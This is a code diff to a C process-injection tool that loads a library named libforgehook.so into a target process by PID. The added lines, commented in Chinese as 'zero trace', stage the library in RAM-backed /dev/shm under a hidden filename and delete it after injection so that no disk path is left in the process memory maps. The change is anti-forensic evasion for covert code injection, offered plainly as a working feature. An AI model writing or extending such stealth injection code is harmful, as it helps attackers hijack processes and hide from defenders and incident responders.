@@ -138,6 +138,33 @@ int main(int argc, char **argv) {
 
     pid_t pid = (pid_t)atoi(argv[1]);
     const char *so = argv[2];
+    char shm_path[256] = {0};
+
+    /* 零痕迹: 如果 so 在磁盘上, 先复制到 /dev/shm/ (tmpfs, RAM-only)
+     * 注入完成后删除, /proc/self/maps 不残留文件路径 */
+    if (strncmp(so, "/dev/shm/", 9) != 0) {
+        const char *bn = strrchr(so, '/');
+        bn = bn ? bn + 1 : so;
+        snprintf(shm_path, sizeof(shm_path), "/dev/shm/.%s", bn);
+
+        /* 复制到 /dev/shm */
+        FILE *src = fopen(so, "rb");
+        FILE *dst = fopen(shm_path, "wb");
+        if (src && dst) {
+            char buf[4096]; size_t n;
+            while ((n = fread(buf, 1, sizeof(buf), src)) > 0)
+                fwrite(buf, 1, n, dst);
+            fclose(dst); fclose(src);
+            chmod(shm_path, 0644);
+            so = shm_path;
+            printf("[*] staged to tmpfs: %s\n", shm_path);
+        } else {
+            if (src) fclose(src);
+            if (dst) { fclose(dst); unlink(shm_path); }
+            printf("[*] tmpfs stage failed, using disk path\n");
+        }
+    }
+
     size_t slen = strlen(so) + 1;
 
     printf("[*] PID=%d SO=%s\n", pid, so);
@@ -323,5 +350,7 @@ int main(int argc, char **argv) {
 
     printf("[+] 注入完成 — libforgehook.so handle=0x%llx\n",
            (unsigned long long)handle);
+    /* 清理 tmpfs 暂存文件 */
+    if (shm_path[0]) unlink(shm_path);
     return 0;
 }
